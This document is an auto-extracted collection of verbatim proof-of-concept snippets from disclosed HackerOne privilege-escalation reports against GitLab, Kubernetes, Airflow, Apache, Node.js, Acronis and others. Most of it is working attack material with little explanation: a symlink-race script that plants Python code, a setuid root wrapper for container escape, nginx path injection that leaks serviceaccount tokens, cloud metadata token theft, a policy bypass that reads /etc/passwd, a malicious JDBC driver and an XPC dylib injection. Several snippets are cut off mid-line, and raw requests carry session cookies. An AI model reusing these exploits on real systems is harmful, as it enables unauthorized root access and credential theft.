# Privilege escalation (local/kernel) — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #689314 Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests — gitlab — $12,000 — Privilege Escalation
Source: `hackerone/reports/2019/689314.md` (https://hackerone.com/reports/689314)

```
override :project_params_attributes
    def project_params_attributes
      super + project_params_ee
    end

def project_params_ee
  attrs = %i[
    # ...
    use_custom_template
    # ...
    group_with_project_templates_id
  ]

  # ...

  attrs
end
```

```
def create
  @project = ::Projects::CreateService.new(current_user, project_params(attributes: project_params_create_attributes)).execute

  # ...
end

# ...

def project_params_attributes
  [
    # ...
    :template_name,
    # ...
  ]
```

```
def execute
  # ...

  group_with_project_templates_id = params.delete(:group_with_project_templates_id) if params[:template_name].blank?

  # ...

    validate_namespace_used_with_template(project, group_with_project_templates_id)
end

# ...

def validate_namespace_used_with_template(project, group_with_project_templates_id)
  return unless project.group

  subgroup_with_templates_id = group_with_project_templates_id || params[:group_with_project_templates_id]
  return if subgroup_with_templates_id.blank?

  templates_owner = ::Group.find(subgroup_with_templates_id).parent

  unless templates_owner.self_and_descendants.exists?(id: project.namespace_id)
    project.errors.add(:namespace, _("is not a descendant of the Group owning the template"))
  end
end
```

## #1842829 Privilege Escalation in kOps using GCE/GCP Provider — kubernetes — $2,500 — Privilege Escalation
Source: `hackerone/reports/2023/1842829.md` (https://hackerone.com/reports/1842829)

```
export KOPS_STATE_STORE=gs://kops-state-test/
export PROJECT=`gcloud config get-value project`

gsutil mb $KOPS_STATE_STORE
kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
kops update cluster --name kops.k8s.local --yes --admin
kops validate cluster --wait 10m
```

```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
  
```

```
  k cp shell-5d64dd647c-8l8s6:/default.token default.token
  
```

## #1382919 Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token — kubernetes — $2,500 — Privilege Escalation
Source: `hackerone/reports/2022/1382919.md` (https://hackerone.com/reports/1382919)

```
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-creator
  namespace: default
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses"]
  verbs: ["get", "create", "update"]
```

```
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: gaf_test-ingress-creator-binding
  namespace: default
subjects:
- kind: User
  name: gaf_test
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: ingress-creator
  apiGroup: rbac.authorization.k8s.io
```

```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: gaf-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  -  http:
      paths:
        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
          pathType: Prefix
          backend:
            service:
              name: some-service
              port:
                number: 5678
```

## #1690093 Airflow Daemon Mode Insecure Umask Privilege Escalation — ibb — $2,400 — Incorrect Permission Assignment for Critical Resource
Source: `hackerone/reports/2022/1690093.md` (https://hackerone.com/reports/1690093)

```
#!/bin/bash
TARGET=/home/airflow
umask 0
cd $TARGET/logs/scheduler/latest/native_dags/example_dags
rm example_bash_operator.py.log
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
until [ -f $TARGET/dags/poc.py ]
do
  sleep 1
done
rm example_bash_operator.py.log
(cat <<'EOF'
import os
os.system("id >>/tmp/pwned")
from airflow import DAG
EOF
) > $TARGET/dags/poc.py
```

## #697055 Worker container escape lead to arbitrary file reading in host machine [again] — semmle — $2,000 — Privilege Escalation
Source: `hackerone/reports/2019/697055.md` (https://hackerone.com/reports/697055)

```
extraction:
  java:
    index:
      build_command:
      - ./custom-build
```

```
    index:
      build_command:
      - ./custom-build
```

## #694181 Worker container escape lead to arbitrary file reading in host machine — semmle — $2,000 — Privilege Escalation
Source: `hackerone/reports/2019/694181.md` (https://hackerone.com/reports/694181)

```
  cpp:
    after_prepare:
      - rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

```
    after_prepare:
      - rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

## #2930811 Attacker can use any non-enabled capability — cosmos — $2,000 — Privilege Escalation
Source: `hackerone/reports/2025/2930811.md` (https://hackerone.com/reports/2930811)

```
The contract defines required capabilities. The environment defines its capabilities. If the required capabilities are all available, the contract can be used. 
```

## #692603 Privilege escalation in workers container  — semmle — $1,500 — Privilege Escalation
Source: `hackerone/reports/2019/692603.md` (https://hackerone.com/reports/692603)

```
#!/bin/sh

ps -ef
sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &
```

```
#include <stdio.h>
void main(int argc, char *argv[]) {
    setreuid(0, 0);
    system(argv[1]);
}
```

```
extraction:
  java:
    prepare:
      packages:
        - /opt/src/work.deb
    after_prepare:
      - echo pwned >> /opt/out/snapshot/log/build.log
      - /usr/bin/setpasswd 'id'
```

## #520903 Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation — ibb — $1,500 — Privilege Escalation
Source: `hackerone/reports/2019/520903.md` (https://hackerone.com/reports/520903)

```
(gdb) p *ap_scoreboard_image 
$3 = {
  global = 0x7f4a9323e008, 
  parent = 0x7f4a9323e020, 
  servers = 0x55835eddea78
}
(gdb) p ap_scoreboard_image->servers[0]
$5 = (worker_score *) 0x7f4a93240820
```

```
(gdb) p ap_scoreboard_image->parent[0]
$6 = {
  pid = 19447, 
  generation = 0, 
  quiescing = 0 '\000', 
  not_accepting = 0 '\000', 
  connections = 0, 
  write_completion = 0, 
  lingering_close = 0, 
  keep_alive = 0, 
  suspended = 0, 
  bucket = 0 <- index for all_buckets
}
(gdb) ptype *ap_scoreboard_image->parent
type = struct process_score {
    pid_t pid;
    ap_generation_t generation;
    char quiescing;
    char not_accepting;
    apr_uint32_t connections;
    apr_uint32_t write_completion;
    apr_uint32_t lingering_close;
    apr_uint32_t keep_alive;
    apr_uint32_t suspended;
    int bucket; <- index for all_buckets
}
```

```
(gdb) p $index = ap_scoreboard_image->parent[0]->bucket
(gdb) p all_buckets[$index]
$7 = {
  pod = 0x7f19db2c7408, 
  listeners = 0x7f19db35e9d0, 
  mutex = 0x7f19db2c7550
}
(gdb) ptype all_buckets[$index]
type = struct prefork_child_bucket {
    ap_pod_t *pod;
    ap_listen_rec *listeners;
    apr_proc_mutex_t *mutex; <--
}
(gdb) ptype apr_proc_mutex_t
apr_proc_mutex_t {
    apr_pool_t *pool;
    const apr_proc_mutex_unix_lock_methods_t *meth; <--
    int curr_locked;
    char *fname;
    ...
}
(gdb) ptype apr_proc_mutex_unix_lock_methods_t
apr_proc_mutex_unix_lock_methods_t {
    ...
    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); <--
    ...
}
```

## #96636 Password Reset - query param overrides postdata — snapchat — $1,500 — Privilege Escalation
Source: `hackerone/reports/2015/96636.md` (https://hackerone.com/reports/96636)

```
https://accounts.snapchat.com/accounts/change_password?
newpassword={someNewPass}&newpassword2={someNewPass}
```

## #1010340 [CVE-2020-27194] Linux kernel: eBPF verifier bug in `or` binary operation tracking function leads to LPE — ibb — $750 — Privilege Escalation
Source: `hackerone/reports/2021/1010340.md` (https://hackerone.com/reports/1010340)

```
Simon reported an issue with the current scalar32_min_max_or() implementation.
That is, compared to the other 32 bit subreg tracking functions, the code in
scalar32_min_max_or() stands out that it's using the 64 bit registers instead
of 32 bit ones. This leads to bounds tracking issues, for example:
  [...]
  8: R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R10=fp0 fp-8=mmmmmmmm
  8: (79) r1 = *(u64 *)(r0 +0)
   R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R10=fp0 fp-8=mmmmmmmm
  9: R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R1_w=inv(id=0) R10=fp0 fp-8=mmmmmmmm
  9: (b7) r0 = 1
  10: R0_w=inv1 R1_w=inv(id=0) R10=fp0 fp-8=mmmmmmmm
  10: (18) r2 = 0x600000002
  12: R0_w=inv1 R1_w=inv(id=0) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  12: (ad) if r1 < r2 goto pc+1
   R0_w=inv1 R1_w=inv(id=0,umin_value=25769803778) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  13: R0_w=inv1 R1_w=inv(id=0,umin_value=25769803778) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  13: (95) exit
  14: R0_w=inv1 R1_w=inv(id=0,umax_value=25769803777,var_off=(0x0; 0x7ffffffff)) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  14: (25) if r1 > 0x0 goto pc+1
   R0_w=inv1 R1_w=inv(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  15: R0_w=inv1 R1_w=inv(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
  15: (95) exit
  16: R0_w=inv1 R1_w=inv(id=0,umin_value=1,umax_value=25769803777,var_off=(0x0; 0x77fffff
```

## #1113289 Guest users can create new test cases — gitlab — $650 — Privilege Escalation
Source: `hackerone/reports/2021/1113289.md` (https://hackerone.com/reports/1113289)

```
    utf8=✓
authenticity_token= your_auth_token
issue[title]=issue_title
issue[description]=issue_description
issue[confidential]=0
issue[issue_type]=issue
issue[lock_version]=0
```

```
      The URL is https://gitlab.com/project_name/-/issues (POST).
```

```
    POST Data format for this is as follows: 
    '''
    utf8=✓
```

## #2120719 Dependency Policy Bypass via process.binding — ibb — $635 — Privilege Escalation
Source: `hackerone/reports/2023/2120719.md` (https://hackerone.com/reports/2120719)

```
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {}
    }
  }
}
```

```
const { spawn } = process.binding("spawn_sync");

function arbitraryExecute(input) {
    const result = spawn({
        maxBuffer: 1048576,
        args: ["node", "-"],
        cwd: undefined,
        detached: false,
        file: "node",
        windowsHide: false,
        windowsVerbatimArguments: false,
        killSignal: undefined,
        stdio: [
            { type: "pipe", readable: true, writable: false, input: Buffer.from(input) },
            { type: "pipe", readable: false, writable: true },
            { type: "pipe", readable: false, writable: true },
        ],
    });

    return {
        output: result.output[1].toString(),
        error: result.output[2].toString(),
    }
}

console.log(arbitraryExecute(`
const fs = require('fs');

fs.readFile('/etc/passwd', 'utf8', (err, data) => {
    if (err) {
        console.error(err);
        return;
    }
    console.log(data);
});
`).output);
```

```
node --experimental-policy=policy.json app.js
```

## #2065288 jdbc apache airflow provider code execution vulnerability — ibb — $520 — Privilege Escalation
Source: `hackerone/reports/2023/2065288.md` (https://hackerone.com/reports/2065288)

```
import java.io.*;
import java.sql.*;
import java.util.Properties;
import java.util.logging.Logger;

public class Test implements Driver {

    static {
        try {
            cmd();
            DriverManager.registerDriver(new Test());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Connection connect(String url, Properties info) throws SQLException {
        return null;
    }

    @Override
    public boolean acceptsURL(String url) throws SQLException {
        try {
            cmd();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        // 验证URL是否为该驱动程序所支持的URL
        return url.startsWith("jdbc:mydb:");
    }

    @Override
    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) throws SQLException {
        return new DriverPropertyInfo[0];
    }

    @Override
    public int getMajorVersion() {
        return 1;
    }

    @Override
    public int getMinorVersion() {
        return 0;
    }

    @Override
    public boolean jdbcCompliant() {
        return false;
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }

    public static void cmd() throws IOException {
        String[] cmd = {"sh", "-c", "whoami"}; 
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamRead
```

```
    static {
        try {
            cmd();
            DriverManager.registerDriver(new Test());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```

```
    @Override
    public Connection connect(String url, Properties info) throws SQLException {
        return null;
    }
```

## #860348 Staff member with no permission can delete POS staff from account settings — shopify — $500 — Privilege Escalation
Source: `hackerone/reports/2020/860348.md` (https://hackerone.com/reports/860348)

```
{"data":{"shop":{"currencyCode":"INR","ianaTimezone":"America\/New_York","countryCode":"IN","features":{"retailPackage":true,"__typename":"ShopFeatures"},"staffPermissionsBetaFlag":false,"accountSetupQuestionsAnswers":[{"answer":"No locations yet","handle":"number_locations","__typename":"AccountSetupQuestionsAnswer"},{"answer":"1","handle":"offline_brick_and_mortar","__typename":"AccountSetupQuestionsAnswer"},{"answer":"1","handle":"offline_markets_fairs","__typename":"AccountSetupQuestionsAnswer"},{"answer":"1","handle":"offline_temp_shops","__typename":"AccountSetupQuestionsAnswer"}],"plan":{"trial":false,"__typename":"ShopPlan"},"accountOwner":{"email":"kunal94@wearehackerone.com","__typename":"StaffMember"},"__typename":"Shop"},"locations":{"edges":[{"node":{"name":"khudirampally, bagdogra","id":"gid:\/\/shopify\/Location\/35202859030","addressVerified":false,"hasActiveInventory":true,"__typename":"Location"},"__typename":"LocationEdge"},{"node":{"name":"test","id":"gid:\/\/shopify\/Location\/35202891798","addressVerified":true,"hasActiveInventory":true,"__typename":"Location"},"__typename":"LocationEdge"}],"__typename":"LocationConnection"},"products":{"edges":[{"node":{"id":"gid:\/\/shopify\/Product\/4351723438102","__typename":"Product"},"__typename":"ProductEdge"}],"__typename":"ProductConnection"}},"extensions":{"cost":{"requestedQueryCost":60,"actualQueryCost":12,"throttleStatus":{"maximumAvailable":600000.0,"currentlyAvailable":599988,"restoreRate":30000.0}}}}
```

## #98499 Apps can access 'channels' beta api — shopify — $500 — Privilege Escalation
Source: `hackerone/reports/2015/98499.md` (https://hackerone.com/reports/98499)

```
    https://victim.myshopify.com/admin/oauth/authorize?client_id=fc49e813f5aad9c8d8f65117031a9684&scope=read_apps,write_apps,write_content,read_content,write_customers,read_customers,read_disputes,write_fulfillments,read_fulfillments,write_gift_cards,read_gift_cards,write_orders,read_orders,read_products,write_products,read_script_tags,write_script_tags,write_scripts,read_scripts,read_shipping,write_shipping,write_social_network_accounts,read_social_network_accounts,read_themes,write_themes,read_channels,write_channels&redirect_uri=http://while42.myshopify.com/&state=123&shop=while42
```

## #119221 User with Read-Only permissions can edit the Internal comment Activities on Bug Reports After Revoke the team access permissions — security — $500 — Privilege Escalation
Source: `hackerone/reports/2016/119221.md` (https://hackerone.com/reports/119221)

```
PUT /activities/815794 HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 402
Accept: application/json, text/javascript, */*; q=0.01
Origin: https://hackerone.com
<redacted>

{"id":815794,"is_internal":true,"editable":true,"type":"Activities::Comment","message":"bugtested","markdown_message":"<p>bugtested</p>\n","automated_response":false,"created_at":"2016-02-28T02:51:41.488Z","updated_at":"2016-02-28T02:51:41.488Z","actor":{"username":"Bob","url":"https://hackerone.com/Bob","profile_picture_urls":{"medium":"/assets/avatars/default-9e818ea07a7aa609d7d6dfa75612832e.png"}}}
```

## #300099 [www.zomato.com] Privilege Escalation - Control reviews - /████dashboard_handler.php — eternal — $300 — Privilege Escalation
Source: `hackerone/reports/2018/300099.md` (https://hackerone.com/reports/300099)

```
get_manager_status
read███████
unread██████████
████████
feature██████
unfeature████████
moderate████
unmoderate█████
drop
███
send_mail
█████████
revoke
mark-spam
spam-revoke
remove-██████
add-█████████
reject_reported█████████
███████
```

```
<form action="https://www.zomato.com/██████████dashboard_handler.php" method="POST">
      <input type="hidden" name="action" value="█████" />
      <input type="hidden" name="review_id" value="31268525" />
      <input type="hidden" name="review" value="Privilege+Escalation" />
      <input type="submit" value="Submit request" />
</form>
```

```
      <input type="hidden" name="action" value="█████" />
      <input type="hidden" name="review_id" value="31268525" />
      <input type="hidden" name="review" value="Privilege+Escalation" />
      <input type="submit" value="Submit request" />
```

## #908162 Acronis True Image Local Privilege Escalation via insecure folder permissions — acronis — $300 — Privilege Escalation
Source: `hackerone/reports/2021/908162.md` (https://hackerone.com/reports/908162)

```
% cat /Library/LaunchDaemons/com.acronis.*
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>KeepAlive</key>
	<false/>
	<key>Label</key>
	<string>com.acronis.acep</string>
	<key>ProgramArguments</key>
	<array>
		<string>/Applications/Acronis True Image.app/Contents/MacOS/prl_stat</string>
		<string>for_scheduler</string>
	</array>
	<key>StartInterval</key>
	<integer>1209600</integer>
</dict>
</plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>KeepAlive</key>
	<dict>
		<key>SuccessfulExit</key>
		<false/>
	</dict>
	<key>Label</key>
	<string>com.acronis.mms_mini</string>
	<key>ProgramArguments</key>
	<array>
		<string>/Applications/Acronis True Image.app/Contents/MacOS/mms_mini/mms_mini.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>KeepAlive</key>
	<dict>
		<key>SuccessfulExit</key>
		<false/>
	</dict>
	<key>Label</key>
	<string>com.acronis.mobile_backup_server</string>
	<key>ProgramArguments</key>
	<array>
		<string>/Applications/Acronis True Image.app/Contents/MacOS//mobile_backup_server/mobile_backup_server.sh</string>
	<
```

## #202499 User with only Viewing Privilege can send message to Room — phabricator — $300 — Privilege Escalation
Source: `hackerone/reports/2017/202499.md` (https://hackerone.com/reports/202499)

```
POST /conpherence/update/1/ HTTP/1.1
Host: 192.168.25.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4
X-Phabricator-Via: /
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Cookie: phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga
Connection: close

__form__=1&action=message&text=TESTTEXT&latest_transaction_id=10&__wflow__=true&__ajax__=true&__metablock__=6
```

## #55670 Fabric.io:  Ex-admin of an organization can delete team members — x — $280 — Privilege Escalation
Source: `hackerone/reports/2015/55670.md` (https://hackerone.com/reports/55670)

```
     VictimOrg id:54af7e07b8568e8c6a0001e
     Victimmember id:552787195127ae16b8000987
```

```
    Proxy shows a similar request as below,
```

## #1075449 Local Privilege Escalation when updating Acronis True Image — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/1075449.md` (https://hackerone.com/reports/1075449)

```
## Steps To Reproduce
I'm using **Acronis True Image Version 2021, Build 32010** and will update it to latest build for demonstration.
{F1151730}
In this example, I will overwrite 
```

```
{F1151731}

[ 2 ] - Create empty 
```

```
{F1151732}

[ 3 ] - Create a symlink from 
```

## #1003007 Local Privilege Escalation via Backup delete — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/1003007.md` (https://hackerone.com/reports/1003007)

```
## Steps To Reproduce
We need to have a backup first to be able to delete it. The **Preparation** part contains the steps to create a backup and **Exploitation** part contains the steps to exploit the vulnerability. If you already have a backup, skip **Preparation** part.


Preparation:
------------
[ 1 ] - Create a file in a folder which is to be backed up. I chose to create a file named 
```

```
{F1028123}

[ 2 ] - In Backup tab of Acronis True Image, click on **Change source** then click on **Files and folders** and select 
```

```
{F1028125}

[ 3 ] - Create a folder to save the backup .tib files in. I chose to create a folder named 
```

## #1008427 DLL Hijacking when sending feedback and crash report leading to Privilege Escalation — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/1008427.md` (https://hackerone.com/reports/1008427)

```
+ CSUNSAPI.dll
+ swift.dll
+ nfhwcrhk.exe
+ SureWareHook.dll
+ aep.dll
+ atasi.dll
+ nusonsll.dll
+ ubsec.dll

Every Windows system contains 
```

```
{F1035152}

Even if 
```

```
## Steps To Reproduce
I created a DLL file which when loaded spawns 
```

## #1010552 DLL Hijacking when creating Rescue Media Builder leading to Privilege Escalation — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/1010552.md` (https://hackerone.com/reports/1010552)

```
Every Windows system contains 
```

```
{F1039832}

Even if 
```

```
## Steps To Reproduce
I created a DLL file which when loaded spawns 
```

## #983363 Local Privilege Escalation when deleting a file from Quarantine — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/983363.md` (https://hackerone.com/reports/983363)

```
{F989876}

[ 1 ] - Create a new folder anywhere on the system.
I created a folder named 'eicar' on my system. %userprofile% is a Windows environment variable for the user folder which is 'C:\Users\Gr33n' in my case.
```

```
{F989879}

[ 2 ] - Write the EICAR string in the folder created above so that Acronis's AV detects it as a threat and puts the file in Quarantine.
```

```
{F989887}

Acronis AV will put eicar.exe into its Quarantine and make the original eicar.exe file empty and hidden.

{F989894}

[ 3 ] - Delete the 'eicar' folder which contains the hidden and empty 'eicar.exe' file as it is a prerequisite for creating a symlink.
```

## #1004740 DLL Hijacking when performing operations in Acronis Secure Zone partition leading to Privilege Escalation — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/1004740.md` (https://hackerone.com/reports/1004740)

```
1) C:\Program Files (x86)\Acronis\TrueImageHome
2) Application's current working directory
3) System directory
4) 16-bit System directory
5) Windows directory
6) Directories in System PATH environment variable
7) Directories in User PATH environment variable

Every Windows system contains 
```

```
{F1030633}

Normal user has Full control over 
```

```
## Steps To Reproduce
An Acronis Secure Zone partition is required for this vulnerability to work.
To create a secure partition,
1) Open Acronis Secure Zone tool from Tools tab.
2) Select a partition from the disk of your choice and click Next.
3) Select how much size you want to give the secure partition and click Next.
4) Click Proceed and True Image will prompt you to reboot the system to complete the operation.

After rebooting, the Secure Zone partition will be created.

I'm assuming the partition is already created in this example.

I created a DLL file which when loaded spawns 
```

## #996576 Local Privilege Escalation using System Clean-up functionality — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2024/996576.md` (https://hackerone.com/reports/996576)

```
{F1011626}

[ 2 ] - Open **System Clean-up** tool.

{F1011636}

[ 3 ] - Select the **deleteme** folder under **Temporary file**. It is not mandatory to only select the newly created folder in Step [ 1 ]. Selecting the whole **Temporary file** or **System Clean-up** option will also work.

{F1011647}

[ 4 ] - Delete the **deleteme** folder as it a prerequisite for creating Directory junction.
```

```
{F1011672}

[ 5 ] - Create a Directory junction from **%userprofile%\AppData\Local\Temp\deleteme** to **C:\Windows\System32\drivers\etc** folder.
```

```
{F1011683}

[ 6 ] - Click on the **Clean-up** option in the System Clean-up window.

{F1011685}

**TrueImageTools.exe** tool will attempt to delete the **deleteme** folder and all the contents inside it but because of the Directory junction, the operations will be performed on **C:\Windows\System32\drivers\etc** folder.

{F1011689}


  **Example No.2**
In this example, I will try to delete the **hosts** file inside **C:\Windows\System32\drivers\etc** which contains the mappings of IP addresses to host names for Windows. Normal user does not have permission to delete these files.

[ 1 ] - Create an empty folder inside **%userprofile%\AppData\Local\Temp** folder. Normal user has full access to this folder.
I created a folder named 'deleteme' on my system. %userprofile% is a Windows environment variable for the user folder which is 'C:\Users\Gr33n' in my case.
```

## #966494 True Image 2021 - LPE via XPC service communication — acronis — $250 — Privilege Escalation
Source: `hackerone/reports/2021/966494.md` (https://hackerone.com/reports/966494)

```
#import <Foundation/Foundation.h>

static NSString* XPCHelperMachServiceName = @"com.acronis.trueimagehelper";

@protocol HelperToolProtocol
- (void)checkFullDiskAccessWithReply:(void (^)(BOOL))arg1;
- (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 environment:(NSDictionary *)arg3 caller:(int)arg4 withReply:(void (^)(int))arg5;
- (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 caller:(int)arg3 withReply:(void (^)(int))arg4;
- (void)getProcessIdentifierWithReply:(void (^)(int))arg1;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {

     
         NSString*  service_name = XPCHelperMachServiceName;

         NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];

         NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];

         [connection setRemoteObjectInterface:interface];

         [connection resume];

         id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error)
         {
             NSLog(@"[-] Something went wrong");
             NSLog(@"[-] Error: %@", error);
         }];

         NSLog(@"obj: %@", obj);
         NSLog(@"conn: %@", connection);

    NSString* proc = @"/Users/Shared/Acronis True Image.app/Contents/MacOS/backup_worker";
    NSArray* args = [NSArray arrayWithObjects:@"/Library/hello.txt", nil];
    NSDictionary* env = @{@"DYLD_INSERT_LIBRARIES":@"/Us
```

```
gcc -dynamiclib -framework Foundation acronis.m -o acronis.dylib
```

```
#include <stdlib.h>

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
	system("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
}
```

## #176979 Authentication Issue — coinbase — $200 — Privilege Escalation
Source: `hackerone/reports/2017/176979.md` (https://hackerone.com/reports/176979)

```
POST /recurring_payments/58087a3d6861ee015644fc48/confirm HTTP/1.1
Host: beta.coinbase.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://beta.coinbase.com/recurring_payments
X-NewRelic-ID: XA4HVVZTGwIAVFVXBAAG
X-CSRF-Token: /hSt/DD82VwI6ks+4P0VTHTDULz5EhHKowGAGfryWcVCZd47s+rQZDCgr70pJK4EeFHkKWRd0SJbVq1K64IZLA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 28
Cookie: __utma=117893787.1205167212.1468114999.1475980536.1476020583.48; __utmz=117893787.1475796788.43.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=https%3A%2F%2Fwww.coinbase.com%2Fusers%2Ffa1f4606a31526801960b8c5703e2fa3%2Fverify; _coinbase=SDhMZytnck5TRi9McEMvMnpzY09OcjhJSlZ3TTZwYlFpWEZWcVlXcW13a1UzL3ZwdVFpdUlBd3RJSXBnSEhnOXZNZkExS1EyQXNNMitWSDVtQVpMVTdrdFRZTGFPRkVFMjZUbGZpVUhaYXA2aFdZa2hmWk55c0JzODM3ZzR0cHFTTmF1RHduOGhuZHFoOExDQ3craFdBWlJDalpOckhISlVtdzArWVMvdy9VSzJ2ZG9tejVIN3FQZXltSTlpeHRMd1VnNVRJL296b0tCT2VkWDlhaVJTWlU0ZkJDVkpPVFVwVXBnY09SVE5tcHVsYXNyMzdmUDdLS0NEbUhPSnI1d2ptM2JFcHFEQ0xQK1VCOWxMZXJFVG9HNlR1MnJXVk9TNjJuczlMN2NQdytWQnVuenZQeVI0bTF0dEc4b0FnWVY0WVZOcUVqOXE1RjYxVUVHV2pXSEdmTDVaYXI4dGNuVFhLb3JJb1N6eGwyMXNPSDRzWXRXNGhMd3l6aS8vSmp1bE94VlVYcit3UEVjc1JaKzVQalFlQzZuNnZLcDMwRE95UHR3MEpIUk1XZnliRlNSR
```

```
POST /recurring_payments/58087a3d6861ee015644fc48/confirm HTTP/1.1
Host: beta.coinbase.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://beta.coinbase.com/recurring_payments
X-NewRelic-ID: XA4HVVZTGwIAVFVXBAAG
X-CSRF-Token: /hSt/DD82VwI6ks+4P0VTHTDULz5EhHKowGAGfryWcVCZd47s+rQZDCgr70pJK4EeFHkKWRd0SJbVq1K64IZLA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 28
